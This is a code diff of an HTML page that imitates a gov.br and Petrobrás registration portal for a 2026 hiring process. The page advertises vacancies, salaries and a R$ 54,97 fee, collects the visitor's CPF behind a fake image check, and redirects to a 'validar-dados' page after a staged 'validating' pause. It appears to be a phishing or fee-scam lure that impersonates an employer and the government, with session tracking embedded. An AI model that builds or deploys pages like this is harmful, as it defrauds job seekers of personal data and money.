@@ -1,162 +1,169 @@
 <html lang="pt-BR">
-    
 <meta http-equiv="content-type" content="text/html;charset=utf-8" />
-    <head>
-        <meta charset="utf-8" />
-        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
-        <title>Processo Seletivo Petrobrás 2026 - Inscrição</title>
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <title>Processo Seletivo Petrobrás 2026 - Inscrição</title>
 
-        <script type="text/javascript">
-            (function (c, l, a, r, i, t, y) {
-                c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments); };
-                t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-                y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-            })(window, document, "clarity", "script", "t84urj3twx");
-        </script>
+    <script type="text/javascript">
+        (function (c, l, a, r, i, t, y) {
+            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments); };
+            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+        })(window, document, "clarity", "script", "t84urj3twx");
+    </script>
 
-        <script src="https://cdn.tailwindcss.com"></script>
-        <link href="all.min.css" rel="stylesheet" />
-        <link href="home.css" rel="stylesheet" />
-        <link href="fonts.css" rel="stylesheet" />
-        
-        <style>
-            .PMSP-color { color: #003f6b; }
-            .PMSP-light { color: #a0a0a0; }
-            .form-header { background-color: #fbc12a; color: white; }
-            .form-footer { background-color: #003f6b; color: white; }
-            button#submit-button { transition: all 0.2s ease; background-color: #003f6b; color: rgba(255, 255, 255, 0.6); }
-            button#submit-button:not([disabled]) { color: white; cursor: pointer; }
-            button#submit-button:not([disabled]):hover { background-color: #4d7396; }
-            .required-star { color: #ff0000; }
-            .footer-bg { background-color: #1c2b39; }
-            .gov-header { background-color: #222222; }
-            .inep-header { background-color: #044785; }
-            input::placeholder { font-family: "Rawline", Arial, sans-serif; }
-            .selected { border: 4px dashed #2b7a9a !important; }
-            .transparent { opacity: 0.5; }
-        </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="all.min.css" rel="stylesheet" />
+    <link href="home.css" rel="stylesheet" />
+    <link href="fonts.css" rel="stylesheet" />
 
-        <script>
-            function formatCPF(input) {
-                let value = input.value.replace(/\D/g, "");
-                if (value.length > 11) value = value.substring(0, 11);
-                if (value.length > 9) value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
-                else if (value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
-                else if (value.length > 3) value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
-                input.value = value;
-                checkFormValidity();
+    <style>
+        .PMSP-color { color: #003f6b; }
+        .form-header { background-color: #fbc12a; color: white; }
+        .form-footer { background-color: #003f6b; color: white; }
+        button#submit-button { transition: all 0.2s ease; background-color: #003f6b; color: rgba(255, 255, 255, 0.6); }
+        button#submit-button:not([disabled]) { color: white; cursor: pointer; }
+        .required-star { color: #ff0000; }
+        .gov-header { background-color: #222222; }
+        .inep-header { background-color: #044785; }
+        .selected { border: 4px dashed #2b7a9a !important; }
+        .transparent { opacity: 0.5; }
+    </style>
+
+    <script>
+        function formatCPF(input) {
+            let value = input.value.replace(/\D/g, "");
+            if (value.length > 11) value = value.substring(0, 11);
+            if (value.length > 9) value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+            else if (value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
+            else if (value.length > 3) value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+            input.value = value;
+            checkFormValidity();
+        }
+
+        function selectImage(element, index) {
+            const images = document.querySelectorAll(".image-option");
+            images.forEach((img) => { img.classList.remove("selected"); img.classList.add("transparent"); });
+            element.classList.add("selected");
+            element.classList.remove("transparent");
+            if (index !== 4) {
+                document.getElementById("error-popup").classList.remove("hidden");
+                setTimeout(() => document.getElementById("error-popup").classList.add("hidden"), 3000);
             }
+            checkFormValidity();
+        }
 
-            function selectImage(element, index) {
-                const images = document.querySelectorAll(".image-option");
-                images.forEach((img) => {
-                    img.classList.remove("selected");
-                    img.classList.add("transparent");
-                });
-                element.classList.add("selected");
-                element.classList.remove("transparent");
-                if (index !== 4) showErrorPopup(); else checkFormValidity();
+        function checkFormValidity() {
+            const cpfInput = document.querySelector("#cpf");
+            const selectedImage = document.querySelector(".image-option.selected");
+            const submitButton = document.querySelector("#submit-button");
+            const images = document.querySelectorAll(".image-option");
+            if (cpfInput.value.length === 14 && selectedImage === images[4]) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
             }
+        }
 
-            function showErrorPopup() {
-                const popup = document.getElementById("error-popup");
-                popup.classList.remove("hidden");
-                setTimeout(() => popup.classList.add("hidden"), 3000);
-            }
+        function submitForm() {
+            document.getElementById("validation-popup").classList.remove("hidden");
+            setTimeout(() => { window.location.href = "validar-dados/index.html"; }, 2000);
+        }
+    </script>
+</head>
 
-            function checkFormValidity() {
-                const cpfInput = document.querySelector("#cpf");
-                const selectedImage = document.querySelector(".image-option.selected");
-                const submitButton = document.querySelector("#submit-button");
-                if (cpfInput.value.length === 14 && selectedImage && selectedImage === document.querySelectorAll(".image-option")[4]) {
-                    submitButton.disabled = false;
-                } else {
-                    submitButton.disabled = true;
-                }
-            }
+<body class="flex flex-col min-h-screen bg-gray-50">
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <img src="images/top_gov-5.jpg" alt="Brasil.gov" class="h-6" />
+            <nav class="flex space-x-4 text-[10px]">
+                <span>ACESSO À INFORMAÇÃO</span>
+                <span>PARTICIPE</span>
+                <span>SERVIÇOS</span>
+            </nav>
+        </div>
+    </header>
 
-            function showValidationPopup() { document.getElementById("validation-popup").classList.remove("hidden"); }
-            function hideValidationPopup() { document.getElementById("validation-popup").classList.add("hidden"); }
+    <div class="inep-header py-3"></div>
 
-            function submitForm() {
-                const cpf = document.querySelector("#cpf").value.replace(/\D/g, "");
-                showValidationPopup();
-                // Simulação da chamada de API do seu código original
-                setTimeout(() => {
-                    window.location.href = "validar-dados/index.html";
-                }, 1500);
-            }
-        </script>
-    </head>
-    <body class="flex flex-col min-h-screen">
-        <header class="gov-header text-white py-2">
-            <div class="container mx-auto flex justify-between items-center px-4">
-                <img src="images/top_gov-5.jpg" alt="Logotipo" class="h-6" />
-                <nav>
-                    <ul class="flex space-x-4 text-[10px]">
-                        <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
-                        <li><a class="hover:underline" href="#">PARTICIPE</a></li>
-                        <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
+    <div class="bg-white py-4 text-center border-b">
+        <img src="images/logopetrobras.png" alt="Petrobrás" class="h-12 mx-auto" style="object-fit: contain;" />
+    </div>
+
+    <main class="flex-grow py-8 px-4">
+        <div class="container mx-auto max-w-3xl">
+            <div class="bg-blue-50 border-l-4 border-blue-500 p-6 mb-6 rounded shadow-sm">
+                <h3 class="text-lg font-bold text-blue-900 mb-4 uppercase">INFORMAÇÕES IMPORTANTES</h3>
+                <p class="text-gray-800 mb-4">Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição para o Processo Seletivo Simplificado Petrobrás 2026:</p>
+                
+                <div class="text-sm text-gray-700 space-y-4">
+                    <p><strong>Cargos:</strong></p>
+                    <p><strong>Nível Médio/Técnico:</strong></p>
+                    <ul class="list-disc list-inside ml-2">
+                        <li>Técnico de Operação (com alta demanda e salários maiores no regime embarcado)</li>
+                        <li>Técnico de Manutenção (Mecânica, Elétrica, Instrumentação, Caldeiraria)</li>
+                        <li>Técnico de Segurança</li>
+                        <li>Técnico de Administração</li>
+                        <li>Química de Petróleo</li>
+                        <li>Inspeção de Equipamentos e Instalações</li>
+                        <li>Logística de Transportes (Controle)</li>
                     </ul>
-                </nav>
-            </div>
-        </header>
 
-        <div class="inep-header py-3"></div>
+                    <p><strong>Nível Superior:</strong></p>
+                    <ul class="list-disc list-inside ml-2">
+                        <li>Engenharia: Petróleo, Processamento, Produção, Mecânica, Elétrica, Civil, Ambiental, Naval, de Segurança de Processo, etc.</li>
+                        <li>Análise: Administração, Comércio e Suprimento, Transporte Marítimo, Sistemas (Software, Infraestrutura, Processos de Negócio), Ciência de Dados, Economia, Estatística, etc.</li>
+                        <li>Geociências: Geologia, Geofísica</li>
+                        <li>Outras: Química, Enfermagem do Trabalho, etc.</li>
+                    </ul>
 
-        <div class="container mx-auto px-4" style="background: white; text-align: center; padding: 15px 0;">
-            <img src="images/logopetrobras.png" alt="Petrobrás" height="60" width="120" style="object-fit: contain; margin: 0 auto;" />
-        </div>
-
-        <main class="flex-grow py-8">
-            <div class="container mx-auto px-4 max-w-3xl">
-                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded">
-                    <h3 class="text-lg font-semibold text-blue-800 mb-2">INFORMAÇÕES IMPORTANTES</h3>
-                    <p class="text-sm text-gray-700">Prezado(a) Candidato(a), bem-vindo ao sistema de inscrição Petrobrás 2026.</p>
-                </div>
-
-                <div class="border border-gray-300 rounded">
-                    <div class="form-header py-2 px-4 text-center">
-                        <h2 class="text-lg">Inscrição &gt; Processo Seletivo Petrobrás 2026</h2>
-                    </div>
-                    <div class="p-4">
-                        <form>
-                            <div class="mb-4">
-                                <label class="block mb-1">CPF: <span class="required-star">*</span></label>
-                                <input id="cpf" class="w-full border border-gray-300 p-2" placeholder="___.___.___-__" type="tel" oninput="formatCPF(this)" />
-                            </div>
-                            <div class="mb-4">
-                                <p class="text-[#2B4F81] font-bold">Clique abaixo, na figura FOLHA: *</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="grid grid-cols-5 gap-1 border-4 border-[#D8E8E8] p-1 bg-[#D8E8E8]">
-                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 0)"><img class="w-6 h-6" src="images/download-6.png" /></div>
-                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 1)"><img class="w-6 h-6" src="images/download-5.png" /></div>
-                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 2)"><img class="w-6 h-6" src="images/download-4.png" /></div>
-                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 3)"><img class="w-6 h-6" src="images/download-3.png" /></div>
-                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 4)"><img class="w-6 h-6" src="images/leaf.png" /></div>
-                                </div>
-                            </div>
-                        </form>
-                    </div>
-                    <div class="form-footer">
-                        <button id="submit-button" class="w-full py-3" type="button" disabled onclick="submitForm()">
-                            <i class="fas fa-paper-plane mr-2"></i> Enviar
-                        </button>
+                    <div class="pt-2 space-y-1">
+                        <p><strong>Vagas:</strong> 9.590 vagas temporárias</p>
+                        <p><strong>Salário:</strong> De R$ 2.676,24 a R$ 19.379,00 + auxílio alimentação de R$ 1.175,00</p>
+                        <p><strong>Taxa de Inscrição:</strong> R$ 54,97</p>
+                        <p><strong>Inscrições:</strong> Até 22 de janeiro de 2026</p>
+                        <p><strong>Prova:</strong> 22 de fevereiro de 2026</p>
+                        <p><strong>Banca:</strong> CEBRASPE</p>
                     </div>
                 </div>
             </div>
-        </main>
 
-        <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-500 text-white p-4 text-center hidden z-50">
-            Você deve selecionar a imagem da FOLHA (5ª imagem) para prosseguir.
-        </div>
-
-        <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
-            <div class="absolute inset-0 bg-black bg-opacity-50"></div>
-            <div class="bg-[#003f6b] text-white p-6 rounded-lg shadow-lg z-10">
-                <p>Validando seus dados...</p>
+            <div class="bg-white border border-gray-300 rounded overflow-hidden shadow-md">
+                <div class="form-header py-3 px-4 text-center font-bold">
+                    Inscrição > Processo Seletivo Petrobrás 2026
+                </div>
+                <div class="p-6">
+                    <div class="mb-6">
+                        <label class="block mb-2 font-bold text-gray-700">CPF: <span class="required-star">*</span></label>
+                        <input id="cpf" type="tel" oninput="formatCPF(this)" placeholder="___.___.___-__" class="w-full p-3 border border-gray-300 rounded outline-none" />
+                    </div>
+                    
+                    <p class="mb-3 font-bold text-[#2B4F81]">Clique abaixo, na figura FOLHA: *</p>
+                    <div class="grid grid-cols-5 gap-1 bg-[#D8E8E8] p-1 border-4 border-[#D8E8E8]">
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 0)"><img src="images/download-6.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 1)"><img src="images/download-5.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 2)"><img src="images/download-4.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 3)"><img src="images/download-3.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 4)"><img src="images/leaf.png" class="w-8 h-8" /></div>
+                    </div>
+                </div>
+                <div class="form-footer">
+                    <button id="submit-button" disabled class="w-full py-4 font-bold uppercase" onclick="submitForm()">Enviar</button>
+                </div>
             </div>
         </div>
-    </body>
+    </main>
+
+    <div id="error-popup" class="fixed top-0 left-0 w-full bg-red-600 text-white p-4 text-center hidden z-50 font-bold">
+        Selecione a imagem da FOLHA para prosseguir.
+    </div>
+
+    <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
+        <div class="absolute inset-0 bg-black opacity-50"></div>
+        <div class="bg-white p-8 rounded-lg z-10 text-center">
+            <p class="text-[#003f6b] font-bold text-xl">Validando dados...</p>
+        </div>
+    </div>
+</body>
 </html>
